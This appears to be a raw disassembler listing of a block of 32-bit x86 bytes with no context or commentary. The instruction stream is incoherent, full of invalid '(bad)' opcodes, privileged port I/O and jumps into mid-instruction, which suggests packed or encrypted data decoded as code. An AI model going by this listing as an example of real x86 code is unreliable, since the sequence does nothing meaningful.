  41a460:	test   DWORD PTR [ebx+eiz*4],ebx
  41a463:	cmp    al,0x7e
  41a465:	nop
  41a466:	xor    ebx,0x6836fa3c
  41a46c:	inc    esi
  41a46d:	xchg   ebp,eax
  41a46e:	(bad)  
  41a46f:	scas   eax,DWORD PTR es:[edi]
  41a470:	dec    eax
  41a471:	jnp    0x41a452
  41a473:	leave  
  41a474:	rcr    DWORD PTR [edx+0x51],cl
  41a477:	fsubrp st(3),st
  41a479:	add    eax,0x4d2b678
  41a47e:	cs aam 0x9e
  41a481:	or     eax,0x6c03fe30
  41a486:	pop    ebx
  41a487:	aaa    
  41a488:	outs   dx,BYTE PTR ds:[esi]
  41a489:	mov    al,ds:0x154e3e73
  41a48e:	add    ch,BYTE PTR [ebx]
  41a490:	xor    DWORD PTR [edx-0x4c],0xffffffe1
  41a494:	lods   eax,DWORD PTR ds:[esi]
  41a495:	lods   eax,DWORD PTR ds:[esi]
  41a496:	pop    ebp
  41a497:	out    0x31,al
  41a499:	add    ebx,edi
  41a49b:	ja     0x41a4da
  41a49d:	mov    eax,0x509a2541
  41a4a2:	sbb    esi,DWORD PTR [edx+0x57]
  41a4a5:	(bad)  
  41a4a6:	push   ebp
  41a4a7:	sub    eax,0xe3d39013
  41a4ac:	sbb    ebp,DWORD PTR [eax+0x5b]
  41a4af:	inc    ecx
  41a4b0:	das    
  41a4b1:	xchg   edi,eax
  41a4b2:	lock ins BYTE PTR es:[edi],dx
  41a4b4:	cld    
  41a4b5:	cld    
  41a4b6:	int3   
  41a4b7:	aas    
  41a4b8:	jmp    DWORD PTR [edi+0x20]
  41a4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4bc:	cmp    eax,ecx
  41a4be:	lock (bad) [esi+0x19b8b262]
  41a4c5:	mov    ebx,0x6fc07996
  41a4ca:	shl    BYTE PTR [esi],1
  41a4cc:	cwde   
  41a4cd:	sub    DWORD PTR [edi],ecx
  41a4cf:	pop    esp
  41a4d0:	xor    DWORD PTR [edi+0x4beaa85f],edi
  41a4d6:	cmc    
  41a4d7:	xchg   edi,eax
  41a4d8:	push   ebp
  41a4d9:	js     0x41a505
  41a4db:	stos   BYTE PTR es:[edi],al
  41a4dc:	clc    
  41a4dd:	arpl   WORD PTR [edi],dx
  41a4df:	sbb    ebx,edi
  41a4e1:	mov    ecx,edx
  41a4e3:	mov    edx,0x5badb652
  41a4e8:	fadd   QWORD PTR [ebx+0x1ca64f1e]
  41a4ee:	sbb    BYTE PTR [ebx+eiz*1-0x2aee208d],al
  41a4f5:	xor    edx,DWORD PTR [ecx-0x61cb8c5f]
  41a4fb:	pop    ds
  41a4fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4fd:	in     al,dx
  41a4fe:	jno    0x41a4d2
  41a500:	cld    
  41a501:	jmp    0x41a4d1
  41a503:	pop    esi
  41a504:	jl     0x41a4b7
  41a506:	mov    dl,BYTE PTR [eax]
  41a508:	lods   eax,DWORD PTR ds:[esi]
  41a509:	jnp    0x41a4f9
  41a50b:	div    bh
  41a50d:	sbb    edx,DWORD PTR [ebp+0x376d2fe3]
  41a513:	adc    al,0xb2
  41a515:	mov    DWORD PTR [eax-0x63],eax
  41a518:	ret    0x323c
  41a51b:	(bad)  
  41a51c:	sub    eax,0xff9f28a0
  41a521:	frstor [eax-0x22ca7969]
  41a527:	xchg   DWORD PTR [ebx],esp
  41a529:	adc    edi,DWORD PTR [edi-0x39]
  41a52c:	call   0x4656:0xf4a0ca15
  41a533:	scas   eax,DWORD PTR es:[edi]
  41a534:	mov    bl,0x74
  41a536:	sbb    al,0xd6
  41a538:	fst    QWORD PTR [ebp-0x5f4b11a4]
  41a53e:	ja     0x41a57d
  41a540:	dec    eax
  41a541:	lds    esp,FWORD PTR [esp+ecx*4-0x38b18ed1]
  41a548:	jmp    0x7729:0xbc473fb1
  41a54f:	xchg   edx,eax
  41a550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a551:	mov    eax,ds:0x466fb54f
  41a556:	fistp  DWORD PTR ds:0xe8ab85c7
  41a55c:	imul   edi,esp,0xa60f13cf
  41a562:	cmp    eax,DWORD PTR [edi]
  41a564:	jnp    0x41a50f
  41a566:	ja     0x41a5a9
  41a568:	cdq    
  41a569:	(bad)  
  41a56a:	xchg   ebp,eax
  41a56b:	int    0x3a
  41a56d:	sbb    ecx,ebx
  41a56f:	in     eax,dx
  41a570:	(bad)  
  41a571:	jae    0x41a527
  41a573:	pop    ss
  41a574:	enter  0x629,0x16
  41a578:	dec    ecx
  41a579:	rcr    BYTE PTR [ebp+0x21],0x32
  41a57d:	cmc    
  41a57e:	(bad)  
  41a581:	adc    ebx,esi
  41a583:	fld    TBYTE PTR [edi+0x62705b72]
  41a589:	int    0x36
  41a58b:	sbb    DWORD PTR [ebx+0x26],ecx
  41a58e:	dec    esi
  41a58f:	cmp    BYTE PTR [edx-0x31197190],ch
  41a595:	jecxz  0x41a60f
  41a597:	jmp    0x41a522
  41a599:	mov    bh,0x1a
  41a59b:	jb     0x41a5a9
  41a59d:	idiv   BYTE PTR [edx]
  41a59f:	js     0x41a603
  41a5a1:	cmp    DWORD PTR [ecx+0x18ce0d3e],eax
  41a5a7:	lahf   
  41a5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a9:	(bad)  
  41a5ac:	xor    DWORD PTR [esi],esi
  41a5ae:	enter  0xf26f,0x35
  41a5b2:	in     al,0x89
  41a5b4:	cdq    
  41a5b5:	mov    al,0x4e
  41a5b7:	repz or BYTE PTR [edx+0x2f60a0d9],al
  41a5be:	lahf   
  41a5bf:	dec    esp
  41a5c0:	fiadd  DWORD PTR [ebx+esi*1+0xd]
  41a5c4:	fisubr WORD PTR [edi+0xb516254]
  41a5ca:	xchg   esi,eax
  41a5cb:	mov    al,ds:0xb33ff32
  41a5d0:	xor    ecx,DWORD PTR [edi]
  41a5d2:	or     ah,dh
  41a5d4:	inc    edx
  41a5d5:	int3   
  41a5d6:	outs   dx,DWORD PTR ds:[esi]
  41a5d7:	fcomip st,st(4)
  41a5d9:	fsubr  QWORD PTR [ebx]
  41a5db:	xchg   ecx,eax
  41a5dc:	idiv   DWORD PTR ds:0x5e7e7344
  41a5e2:	aad    0x20
  41a5e4:	(bad)  
  41a5e5:	fwait
  41a5e6:	iret   
  41a5e7:	fsub   QWORD PTR [ebp+0x15]
  41a5ea:	dec    BYTE PTR [ecx]
  41a5ec:	mov    edi,0x939502e5
  41a5f1:	test   DWORD PTR [edi+0x2d],esp
  41a5f4:	jle    0x41a57d
  41a5f6:	fadd   DWORD PTR [ebx-0x3c]
  41a5f9:	jo     0x41a603
  41a5fb:	pop    ds
  41a5fc:	sbb    eax,0xf439dbff
  41a601:	in     al,dx
  41a602:	fwait
  41a603:	scas   eax,DWORD PTR es:[edi]
  41a604:	loop   0x41a611
  41a606:	call   0x38b5:0x2d613f36
  41a60d:	repz adc BYTE PTR [edx],ch
  41a610:	icebp  
  41a611:	mov    dh,0x35
  41a613:	xchg   esp,eax
  41a614:	mov    ebp,0x79a34f5b
  41a619:	stos   DWORD PTR es:[edi],eax
  41a61a:	push   es
  41a61b:	or     al,0xf9
  41a61d:	cmp    BYTE PTR [edx-0x6cad6577],dh
  41a623:	retf   0xc65
  41a626:	cmp    bl,BYTE PTR [eax+0x52]
  41a629:	mov    bh,0x62
  41a62b:	aas    
  41a62c:	nop
  41a62d:	stc    
  41a62e:	and    BYTE PTR [ecx*8-0x4901cf79],0x35
  41a636:	out    0xb4,eax
  41a638:	adc    BYTE PTR [edi-0x3f815ceb],dh
  41a63e:	fsin   
  41a640:	call   0xd318:0x43436660
  41a647:	mov    ecx,gs
  41a649:	daa    
  41a64a:	and    ah,0x6a
  41a64d:	and    al,0x91
  41a64f:	xchg   BYTE PTR [eax],ah
  41a651:	add    al,0xfb
  41a653:	cmp    DWORD PTR [ecx],edx
  41a655:	clc    
  41a656:	ficom  DWORD PTR [ecx-0x11]
  41a659:	in     eax,0x7e
  41a65b:	lahf   
  41a65c:	adc    ecx,ebp
  41a65e:	adc    ch,ch
  41a660:	in     al,dx
  41a661:	push   ebx
  41a662:	jae    0x41a5fa
  41a664:	sar    DWORD PTR [ecx+0x47],cl
  41a667:	push   edx
  41a668:	daa    
  41a669:	cdq    
  41a66a:	loopne 0x41a6b8
  41a66c:	inc    esi
  41a66d:	(bad)  
  41a66f:	mov    edx,0xbfcb0dc7
  41a674:	into   
  41a675:	mov    bl,dh
  41a677:	fld    QWORD PTR [esi-0x31]
  41a67a:	in     eax,0xb9
  41a67c:	xor    al,0xd
  41a67e:	push   edx
  41a67f:	int3   
  41a680:	jnp    0x41a687
  41a682:	mov    ebx,0xc14a25ac
  41a687:	jecxz  0x41a6ac
  41a689:	mov    ah,0x93
  41a68b:	rcl    ecx,0xc9
  41a68e:	lods   eax,DWORD PTR ds:[esi]
  41a68f:	(bad)  
  41a690:	push   edx
  41a691:	xchg   ebx,eax
  41a692:	mov    ebx,0x32151899
  41a697:	arpl   sp,bx
  41a699:	pop    ebx
  41a69a:	imul   esp,DWORD PTR ds:0xb6565648,0x4c
  41a6a1:	mov    DWORD PTR [ebx+0x5e3b4c0b],edi
  41a6a7:	das    
  41a6a8:	das    
  41a6a9:	rcr    dl,1
  41a6ab:	jb     0x41a6f8
  41a6ad:	inc    edi
  41a6ae:	addr16 xchg ebp,eax
  41a6b0:	iret   
  41a6b1:	push   ss
  41a6b2:	mov    edi,0xb6741b67
  41a6b7:	mov    cl,BYTE PTR [esi+0x73]
  41a6ba:	ss retf 
  41a6bc:	dec    ecx
  41a6bd:	fsubrp st(6),st
  41a6bf:	and    eax,0x261b0773
  41a6c4:	mov    bl,0xcb
  41a6c6:	mov    dh,0x73
  41a6c8:	or     dh,BYTE PTR [ecx]
  41a6ca:	in     eax,dx
  41a6cb:	jmp    0x41a6e7
  41a6cd:	push   ecx
  41a6ce:	sar    BYTE PTR [ebx-0x7],1
  41a6d1:	loop   0x41a71d
  41a6d3:	pop    es
  41a6d4:	adc    DWORD PTR [ebp-0x2e],esp
  41a6d7:	and    al,BYTE PTR [ebp+edi*4+0x579d4d18]
  41a6de:	int    0x4a
  41a6e0:	jb     0x41a6a8
  41a6e2:	xor    ch,BYTE PTR [edx]
  41a6e4:	mov    al,ds:0xa8cbce22
  41a6e9:	rcr    DWORD PTR [edx],cl
  41a6eb:	xor    edi,esi
  41a6ed:	xchg   ebx,eax
  41a6ee:	add    BYTE PTR [ebx],ch
  41a6f0:	inc    esp
  41a6f1:	dec    ebp
  41a6f2:	repz and al,0xde
  41a6f5:	aas    
  41a6f6:	loope  0x41a72c
  41a6f8:	(bad)  
  41a6f9:	repnz push 0x2edc7c10
  41a6ff:	out    0xed,al
  41a701:	test   BYTE PTR [ecx+esi*1],dl
  41a704:	push   0x70
  41a706:	shr    bh,0x3d
  41a709:	jbe    0x41a74c
  41a70b:	pop    edi
  41a70c:	pop    edi
  41a70d:	xor    dh,cl
  41a70f:	push   esi
  41a710:	cmp    eax,0x98c7e0ad
  41a715:	into   
  41a716:	mov    ds:0xee40f590,al
  41a71b:	jno    0x41a78f
  41a71d:	std    
  41a71e:	fnstcw WORD PTR [edi+0x21]
  41a721:	ret    
  41a722:	sbb    al,0x8b
  41a724:	ins    DWORD PTR es:[edi],dx
  41a725:	inc    ebx
  41a726:	pop    ebp
  41a727:	xchg   ebp,eax
  41a728:	scas   eax,DWORD PTR es:[edi]
  41a729:	adc    dh,dl
  41a72b:	push   esi
  41a72c:	aam    0x8e
  41a72e:	outs   dx,BYTE PTR cs:[esi]
  41a730:	xchg   edi,eax
  41a731:	icebp  
  41a732:	icebp  
  41a733:	in     eax,0x6
  41a735:	xchg   edx,eax
  41a736:	sbb    ch,BYTE PTR ds:0x7bb61d29
  41a73c:	clc    
  41a73d:	fidivr DWORD PTR ds:0x63b5e044
  41a743:	cmp    DWORD PTR [ebx+esi*2+0x54],0xfabdcfdc
  41a74b:	(bad)  
  41a74c:	sub    BYTE PTR [ecx-0x32dce223],ah
  41a752:	imul   esp,edi,0xa4065cee
  41a758:	ret    0xab9
  41a75b:	adc    ecx,DWORD PTR [esi]
  41a75d:	push   ebp
  41a75e:	push   esi
  41a75f:	ret    0x8e8d
  41a762:	inc    ebp
  41a763:	not    ch
  41a765:	mov    esp,0x608786e3
  41a76a:	ja     0x41a7e7
  41a76c:	jno    0x41a746
  41a76e:	sti    
  41a76f:	sbb    al,0x99
  41a771:	aam    0x22
  41a773:	xchg   ebx,eax
  41a774:	popf   
  41a775:	add    edx,edi
  41a777:	dec    esi
  41a778:	cli    
  41a779:	pop    edx
  41a77a:	jae    0x41a7dd
  41a77c:	stos   BYTE PTR es:[edi],al
  41a77d:	sahf   
  41a77e:	stos   BYTE PTR es:[edi],al
  41a77f:	scas   eax,DWORD PTR es:[edi]
  41a780:	and    eax,0xbed38f00
  41a785:	sahf   
  41a786:	cmc    
  41a787:	cmp    ch,bl
  41a789:	pushf  
  41a78a:	daa    
  41a78b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a78c:	mov    edi,0xc15efec6
  41a791:	(bad)  
  41a792:	call   0x668e:0x3540e01e
  41a799:	pop    eax
  41a79a:	mov    eax,0x574d947b
  41a79f:	lea    edi,[ecx+edx*4]
  41a7a2:	or     DWORD PTR [ecx],esp
  41a7a4:	mov    esp,0xe1968716
  41a7a9:	jmp    0x91c9c2ba
  41a7ae:	and    DWORD PTR [edx],0xc2413f59
  41a7b4:	loopne 0x41a774
  41a7b6:	out    0xc8,eax
  41a7b8:	rcr    BYTE PTR ds:0x3c8a7cf3,cl
  41a7be:	enter  0x6870,0xfa
  41a7c2:	outs   dx,BYTE PTR ds:[esi]
  41a7c3:	mov    ebx,0x17ae4396
  41a7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c9:	lea    ebp,[ebx-0xc]
  41a7cc:	add    BYTE PTR [ecx],cl
  41a7ce:	and    al,0x1
  41a7d0:	and    al,0xbe
  41a7d2:	(bad)  
  41a7d3:	xchg   ecx,eax
  41a7d4:	stos   DWORD PTR es:[edi],eax
  41a7d5:	repz in al,0xfc
  41a7d8:	hlt    
  41a7d9:	icebp  
  41a7da:	imul   esp,ebp,0x91acae79
  41a7e0:	scas   al,BYTE PTR es:[edi]
  41a7e1:	mov    cl,0xcb
  41a7e3:	inc    edx
  41a7e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7e5:	mov    ebp,0x1b83180f
  41a7ea:	xor    BYTE PTR [ecx+0x42f6062f],dl
  41a7f0:	ror    DWORD PTR [eax],cl
  41a7f2:	sbb    edi,DWORD PTR [ecx-0x78231168]
  41a7f8:	sti    
  41a7f9:	stos   BYTE PTR es:[edi],al
  41a7fa:	test   eax,edx
  41a7fc:	fidiv  DWORD PTR [edx-0x2e]
  41a7ff:	and    eax,0xea5e64ef
  41a804:	fwait
  41a805:	jg     0x41a7a4
  41a807:	inc    ecx
  41a808:	int    0x8f
  41a80a:	js     0x41a7b3
  41a80c:	mov    edx,0xe50b36f9
  41a811:	les    edx,FWORD PTR [edi]
  41a813:	sub    edx,eax
  41a815:	les    ecx,FWORD PTR [esi]
  41a817:	and    cl,BYTE PTR [edi+edx*8-0x2f111cb1]
  41a81e:	aas    
  41a81f:	fcmovb st,st(6)
  41a821:	push   eax
  41a822:	mov    edi,edx
  41a824:	mov    BYTE PTR [eax-0x8],bl
  41a827:	xchg   esi,eax
  41a828:	loope  0x41a85d
  41a82a:	add    BYTE PTR [esi+0x63ac669f],ah
  41a830:	mov    dh,0x33
  41a832:	cmp    edi,esi
  41a834:	fstp   TBYTE PTR [edi]
  41a836:	jp     0x41a89f
  41a838:	retf   0x495f
  41a83b:	pop    esi
  41a83c:	(bad)  
  41a83e:	icebp  
  41a83f:	ins    BYTE PTR es:[edi],dx
  41a840:	mov    edi,0x90df07c9
  41a845:	mov    ebx,0x348ce814
  41a84a:	adc    bh,BYTE PTR [esi+0x35]
  41a84d:	mov    al,0xb6
  41a84f:	retf   
  41a850:	sub    esi,ecx
  41a852:	xchg   edi,eax
  41a853:	mov    ds:0x725d9cf1,al
  41a858:	pop    ecx
  41a859:	dec    edx
  41a85a:	mov    dh,0x1f
  41a85c:	mov    dl,0xc5
  41a85e:	mov    ah,0x21
  41a860:	push   ebp
  41a861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a862:	rcl    DWORD PTR [ebp+0x70],0x4b
  41a866:	jo     0x41a8be
  41a868:	mov    bh,0x94
  41a86a:	pusha  
  41a86b:	pop    edi
  41a86c:	push   edx
  41a86d:	jecxz  0x41a800
  41a86f:	inc    eax
  41a870:	imul   esp,DWORD PTR [edi],0x34
  41a873:	js     0x41a847
  41a875:	in     al,0xc0
  41a877:	inc    ebx
  41a878:	jle    0x41a88c
  41a87a:	pop    ss
  41a87b:	popf   
  41a87c:	sbb    ebx,DWORD PTR [esi]
  41a87e:	mov    dh,ah
  41a880:	mov    eax,0x7f4c0d5a
  41a885:	push   es
  41a886:	mov    al,0xb7
  41a888:	rcl    DWORD PTR [esi+esi*8],0x63
  41a88c:	bound  ebp,QWORD PTR [edi]
  41a88e:	xchg   esp,eax
  41a88f:	ror    BYTE PTR [edx],0xa
  41a892:	push   esp
  41a893:	pop    ecx
  41a894:	imul   edi,DWORD PTR [eax],0x3f
  41a897:	sub    eax,0xc66a9d39
  41a89c:	(bad)  
  41a89d:	dec    edi
  41a89f:	dec    ecx
  41a8a0:	idiv   bh
  41a8a2:	push   edx
  41a8a3:	lods   eax,DWORD PTR ds:[esi]
  41a8a4:	arpl   ax,ax
  41a8a6:	fst    DWORD PTR [ecx-0x65]
  41a8a9:	ins    BYTE PTR es:[edi],dx
  41a8aa:	mov    al,ds:0x45aee835
  41a8af:	adc    eax,DWORD PTR [ebx-0x8]
  41a8b2:	stc    
  41a8b3:	test   eax,0x201467d8
  41a8b8:	les    edx,FWORD PTR ds:0xcd575189
  41a8be:	shl    BYTE PTR [edx-0x1c0820d9],1
  41a8c4:	mov    ds:0x521377a1,eax
  41a8c9:	push   eax
  41a8ca:	sub    edi,edi
  41a8cc:	cmc    
  41a8cd:	(bad)  
  41a8cf:	push   ds
  41a8d0:	fs cmp ebx,ebp
  41a8d3:	pop    eax
  41a8d4:	and    al,0xbb
  41a8d6:	ss data16 daa 
  41a8d9:	or     ch,BYTE PTR [eax+eiz*1-0x7e890340]
  41a8e0:	jns    0x41a939
  41a8e2:	ja     0x41a93b
  41a8e4:	dec    edx
  41a8e5:	push   eax
  41a8e6:	je     0x41a951
  41a8e8:	dec    ecx
  41a8e9:	sbb    bh,BYTE PTR [ebx+eax*8-0x18]
  41a8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ee:	(bad)
  41a8f2:	adc    eax,0x165cbab6
  41a8f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a8f9:	ret    
  41a8fa:	fucom  st(6)
  41a8fc:	dec    edx
  41a8fd:	stos   BYTE PTR es:[edi],al
  41a8fe:	jnp    0x41a8c9
  41a900:	pusha  
  41a901:	sbb    eax,0xc0b5489e
  41a906:	cmp    ebp,DWORD PTR [ebx-0x63636d4a]
  41a90c:	les    edi,FWORD PTR es:[esp+ebx*4-0x225ac41d]
  41a914:	mov    ecx,0x6954ffdf
  41a919:	jae    0x41a933
  41a91b:	mov    eax,ebp
  41a91d:	inc    ebp
  41a91e:	and    dh,BYTE PTR [edi]
  41a920:	icebp  
  41a921:	mov    ebp,0xed79ab8b
  41a926:	aaa    
  41a927:	jge    0x41a8fb
  41a929:	adc    eax,DWORD PTR [ebx-0x52]
  41a92c:	aaa    
  41a92d:	(bad)  
  41a92e:	pop    ebx
  41a92f:	into   
  41a930:	sti    
  41a931:	mov    edi,DWORD PTR [ebx]
  41a933:	mov    ah,0x6e
  41a935:	lods   eax,DWORD PTR ds:[esi]
  41a936:	xchg   ecx,eax
  41a937:	xor    DWORD PTR [eax-0x7a],edi
  41a93a:	mov    esi,0xe99fb448
  41a93f:	adc    ecx,0xffffffc2
  41a942:	cmp    DWORD PTR [ecx],ecx
  41a944:	cmp    al,0xb2
  41a946:	pop    edi
  41a947:	cmp    eax,0x2d6fd7f3
  41a94c:	xchg   ebp,eax
  41a94d:	mov    ebx,0x6bfb65d
  41a952:	pop    esi
  41a953:	mov    bl,0x1a
  41a955:	out    0x86,al
  41a957:	xor    esi,DWORD PTR [ebx-0x15]
  41a95a:	mov    edx,0xf44ca99d
  41a95f:	ins    BYTE PTR es:[edi],dx
  41a960:	in     eax,0x3a
  41a962:	jl     0x41a908
  41a964:	and    eax,0xf151e7b5
  41a969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a96a:	sbb    BYTE PTR [edx+0x3e0cd035],bl
  41a970:	ss mov ebp,0xacd909f9
  41a976:	cmp    cl,BYTE PTR [eax]
  41a978:	mov    esi,fs
  41a97a:	jb     0x41a9eb
  41a97c:	ret    
  41a97d:	push   0x1e
  41a97f:	mov    ecx,0x71dd9a45
  41a984:	in     eax,dx
  41a985:	mov    ch,BYTE PTR [edi-0x4b]
  41a988:	fidiv  WORD PTR [ebp-0x64]
  41a98b:	xlat   BYTE PTR ds:[ebx]
  41a98c:	or     esi,DWORD PTR [ecx+0x9475e41]
  41a992:	icebp  
  41a993:	push   ecx
  41a994:	adc    eax,0x5616f67d
  41a999:	push   esp
  41a99a:	push   ebx
  41a99b:	inc    edx
  41a99c:	adc    eax,0x482788ef
  41a9a1:	mov    edi,0x27f43a80
  41a9a6:	pusha  
  41a9a7:	pop    ds
  41a9a8:	int3   
  41a9a9:	sub    ecx,DWORD PTR [edx-0x54dae479]
  41a9af:	cmp    eax,0x6459daba
  41a9b4:	mov    ecx,0x95e46f4b
  41a9b9:	into   
  41a9ba:	pop    ebp
  41a9bb:	(bad)
  41a9bf:	out    0x47,eax
  41a9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9c2:	mov    WORD PTR [edi+0x52],?
  41a9c5:	ins    BYTE PTR es:[edi],dx
  41a9c6:	scas   eax,DWORD PTR es:[edi]
  41a9c7:	(bad)  
  41a9c8:	and    al,0xb3
  41a9ca:	in     al,0x9d
  41a9cc:	lods   al,BYTE PTR ds:[esi]
  41a9cd:	pop    edi
  41a9ce:	scas   al,BYTE PTR es:[edi]
  41a9cf:	dec    edx
  41a9d0:	int3   
  41a9d1:	test   BYTE PTR [eax+0x5ee2fb63],dl
  41a9d7:	bound  eax,QWORD PTR [edx+0xe]
  41a9da:	xchg   ebp,eax
  41a9db:	data16 cmp ah,BYTE PTR [edx]
  41a9de:	mov    ds:0x4777914,al
  41a9e3:	sbb    DWORD PTR [ebx+0x31f62f7d],ebx
  41a9e9:	mov    ah,0xe0
  41a9eb:	sub    BYTE PTR [eax+esi*4+0x65],ch
  41a9ef:	xchg   ecx,eax
  41a9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f1:	mov    eax,ds:0x3775b70e
  41a9f6:	je     0x41a99a
  41a9f8:	and    esi,esp
  41a9fa:	xor    eax,DWORD PTR [esi]
  41a9fc:	pop    esp
  41a9fd:	les    ecx,FWORD PTR ds:0x920c836c
  41aa03:	enter  0x4afb,0x6a
  41aa07:	jbe    0x41aa86
  41aa09:	xchg   BYTE PTR [ebx-0x2f],bl
  41aa0c:	into   
  41aa0d:	sbb    BYTE PTR [esi-0x18],0xec
  41aa11:	(bad)  
  41aa12:	cld    
  41aa13:	sahf   
  41aa14:	cs popa 
  41aa16:	push   esp
  41aa17:	ins    BYTE PTR es:[edi],dx
  41aa18:	jnp    0x41aa53
  41aa1a:	mov    ecx,0x156d972a
  41aa1f:	aaa    
  41aa20:	out    0xf0,al
  41aa22:	mov    esi,0x3d47fb8b
  41aa27:	les    edi,FWORD PTR [ebx-0x33]
  41aa2a:	test   eax,0xb032e8ff
  41aa2f:	scas   eax,DWORD PTR es:[edi]
  41aa30:	call   ebp
  41aa32:	add    DWORD PTR [esi+0x9454a2a],edx
  41aa38:	inc    ebx
  41aa39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa3a:	mov    ebp,0x79a7079
  41aa3f:	inc    ebx
  41aa40:	jae    0x41a9f7
  41aa42:	nop
  41aa43:	es js  0x41aa8a
  41aa46:	cdq    
  41aa47:	int    0x49
  41aa49:	arpl   WORD PTR [edx],di
  41aa4b:	lahf   
  41aa4c:	fsub   DWORD PTR [ebx+0x7f]
  41aa4f:	cmp    eax,DWORD PTR [ebx]
  41aa51:	(bad)  
  41aa53:	dec    esp
  41aa54:	inc    edi
  41aa55:	into   
  41aa56:	jle    0x41aa0d
  41aa58:	repnz retf 
  41aa5a:	gs inc esp
  41aa5c:	sbb    dh,BYTE PTR [esi]
  41aa5e:	out    dx,al
  41aa5f:	mov    esp,esp
  41aa61:	fwait
  41aa62:	mov    WORD PTR [esi-0x3e],cs
  41aa65:	stc    
  41aa66:	lock fsub DWORD PTR [ebp-0x2a067fd6]
  41aa6d:	shl    BYTE PTR [edi],1
  41aa6f:	pop    ecx
  41aa70:	mov    ds:0x2890d177,eax
  41aa75:	outs   dx,BYTE PTR ds:[esi]
  41aa76:	pop    ds
  41aa77:	or     al,BYTE PTR [edx+0x6bec2a21]
  41aa7d:	mov    bh,0x3e
  41aa7f:	addr16 lock pop edi
  41aa82:	xchg   edx,eax
  41aa83:	mov    dl,0x91
  41aa85:	or     DWORD PTR [ecx],ebp
  41aa87:	rcl    BYTE PTR [edi],0x84
  41aa8a:	xlat   BYTE PTR ds:[ebx]
  41aa8b:	pop    es
  41aa8c:	imul   edi,DWORD PTR [esi-0x7c8c647e],0x7e
  41aa93:	push   esi
  41aa94:	pop    eax
  41aa95:	fucom  st(4)
  41aa97:	jecxz  0x41aa47
  41aa99:	ins    DWORD PTR es:[edi],dx
  41aa9a:	push   0x48212270
  41aa9f:	sahf   
  41aaa0:	clc    
  41aaa1:	scas   al,BYTE PTR es:[edi]
  41aaa2:	cmp    eax,0x38b854bf
  41aaa7:	repz adc DWORD PTR [ecx],0x4c
  41aaab:	test   al,0xef
  41aaad:	ror    BYTE PTR [edx+0x43],0x80
  41aab1:	jecxz  0x41aada
  41aab3:	rcl    esp,cl
  41aab5:	iret   
  41aab6:	push   cs
  41aab7:	pushf  
  41aab8:	sbb    ebp,DWORD PTR [ebx-0x10]
  41aabb:	pop    esp
  41aabc:	pushf  
  41aabd:	pop    ds
  41aabe:	in     eax,dx
  41aabf:	sbb    dh,BYTE PTR ds:0x6c63ab67
  41aac5:	jp     0x41aaa9
  41aac7:	mul    DWORD PTR [esi-0x23]
  41aaca:	lds    ebx,FWORD PTR [ecx-0x7e]
  41aacd:	lods   eax,DWORD PTR ds:[esi]
  41aace:	mov    edi,0xed3f6d1e
  41aad3:	lods   al,BYTE PTR ds:[esi]
  41aad4:	loopne 0x41aa64
  41aad6:	mov    eax,ds:0xd7191e58
  41aadb:	sub    eax,0x9baa1631
  41aae0:	add    cl,cl
  41aae2:	shr    dl,1
  41aae4:	pop    esi
  41aae5:	lds    ebx,FWORD PTR [eax+0x1b]
  41aae8:	cmp    DWORD PTR [edx+0x6a],ebx
  41aaeb:	gs stos DWORD PTR es:[edi],eax
  41aaed:	cli    
  41aaee:	mov    bl,0xfe
  41aaf0:	add    BYTE PTR [ebp-0x2b],ch
  41aaf3:	nop
  41aaf4:	repz mov ah,0x37
  41aaf7:	inc    eax
  41aaf8:	pop    ecx
  41aaf9:	inc    BYTE PTR [edx+eax*4+0x12]
  41aafd:	aad    0xc4
  41aaff:	call   0x6a06:0xd022783c
  41ab06:	push   ebp
  41ab07:	mov    dh,0x20
  41ab09:	pop    edi
  41ab0a:	push   ecx
  41ab0b:	lds    edi,FWORD PTR [ebp-0x3fb24b0]
  41ab11:	xchg   DWORD PTR [edx+0x62d2e518],ecx
  41ab17:	aaa    
  41ab18:	int    0x97
  41ab1a:	mov    DWORD PTR [eax+0x7f],0xdaff85eb
  41ab21:	in     al,dx
  41ab22:	mov    cl,0x43
  41ab24:	dec    eax
  41ab25:	adc    eax,0xf0d77563
  41ab2a:	and    al,BYTE PTR cs:[edi+0x71e92988]
  41ab31:	pop    ebx
  41ab32:	(bad)  [ebx]
  41ab34:	mov    ds:0xaafb3fad,eax
  41ab39:	xchg   edi,eax
  41ab3a:	lea    ebp,[ebp+0x4e]
  41ab3d:	ja     0x41aba2
  41ab3f:	lock mov ch,BYTE PTR [edx]
  41ab42:	pop    ecx
  41ab43:	cmp    BYTE PTR [eax],bl
  41ab45:	aam    0x1c
  41ab47:	out    0x2e,eax
  41ab49:	sbb    al,BYTE PTR [esi]
  41ab4b:	add    dl,BYTE PTR [esi-0x4cf29ad3]
  41ab51:	mov    edx,0x94575476
  41ab56:	mov    ecx,0x232187b5
  41ab5b:	mov    eax,ds:0xa38518a
  41ab60:	nop
  41ab61:	fs dec si
  41ab64:	aas    
  41ab65:	pop    ss
  41ab66:	shl    ah,1
  41ab68:	mov    ebx,0xeeefb1b1
  41ab6d:	mov    ds:0x1bd91fcf,al
  41ab72:	mov    dh,0xd1
  41ab74:	add    edi,edi
  41ab76:	test   al,0x54
  41ab78:	mov    al,ds:0x1c071132
  41ab7d:	pusha  
  41ab7e:	fsubr  DWORD PTR [edx]
  41ab80:	xor    cl,dh
  41ab82:	xchg   bh,dh
  41ab84:	test   eax,0x900febe7
  41ab89:	fwait
  41ab8a:	cmp    edx,DWORD PTR [esp+eax*4]
  41ab8d:	jbe    0x41ab78
  41ab8f:	mov    bl,0x7c
  41ab91:	xchg   DWORD PTR [ebx+eiz*2],ecx
